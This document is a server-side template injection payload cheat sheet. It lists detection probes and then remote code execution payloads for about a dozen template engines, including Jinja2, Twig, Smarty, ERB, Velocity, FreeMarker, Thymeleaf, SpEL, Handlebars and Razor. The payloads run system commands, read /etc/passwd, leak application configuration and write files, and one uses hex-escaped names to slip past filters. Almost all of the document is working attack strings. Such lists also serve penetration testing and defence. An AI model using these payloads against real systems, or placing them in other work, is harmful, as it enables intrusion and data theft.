# PAYLOADS: SSTI — All Engines
## Version: 1.0 | Domain: payloads

---

## DETECTION
```
${7*7}            # Java EL, FreeMarker
{{7*7}}           # Jinja2, Twig, Liquid, Handlebars (output)
<%= 7*7 %>        # ERB, ASP.NET inline
#{7*7}            # Ruby, Pebble
@{7*7}            # Razor (Razor uses @ but not arithmetic in this form; check context)
{7*'7'}           # JS, possibly Smarty
*{7*7}            # Thymeleaf
${{7*7}}          # combo probe
%{7*7}            # Velocity (some)
```

## JINJA2 / FLASK
```
{{7*7}}                                                                # 49
{{config}}                                                             # leak app config
{{config.items()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()}}     # find Popen
{{''.__class__.__mro__[1].__subclasses__()[<idx>]("id",shell=True,stdout=-1).communicate()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{lipsum.__globals__['os'].popen('id').read()}}
{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

## TWIG (PHP)
```
{{7*7}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{['cat /etc/passwd']|map('system')|join}}
```

## SMARTY
```
{$smarty.version}
{php}phpinfo();{/php}                 # if {php} tag enabled
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php phpinfo();?>",self::clearConfig())}
{system('id')}                         # SmartyBC
```

## ERB / RAILS
```
<%= 7*7 %>
<%= system('id') %>
<%= `id` %>
<%= File.open('/etc/passwd').read %>
<%= eval(params[:p]) %>
```

## VELOCITY (JAVA)
```
#set($x="")
#set($r=$x.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null))
#set($p=$r.exec("id"))
#set($i=$p.getInputStream())
#set($r2=$x.getClass().forName("java.util.Scanner").getDeclaredConstructor($i.getClass()).newInstance($i).useDelimiter("\\\\A"))
$r2.next()
```

## FREEMARKER
```
${"freemarker.template.utility.Execute"?new()("id")}
<#assign value="freemarker.template.utility.Execute"?new()>${value("id")}
```

## THYMELEAF
```
*{T(java.lang.Runtime).getRuntime().exec('id')}
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
```

## PEBBLE
```
{{ variable.getClass().forName('java.lang.Runtime').getMethod('exec',''.getClass()).invoke(null,'id') }}
```

## SPRING SpEL
```
T(java.lang.Runtime).getRuntime().exec('id')
new ProcessBuilder({'id'}).start()
```

## HANDLEBARS (NODE)
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

## RAZOR (.NET)
```
@(1+1)
@System.Diagnostics.Process.Start("cmd.exe","/c calc")
```

## REFERENCES
PortSwigger SSTI labs, tplmap, Sec-1 SSTI cheat sheet
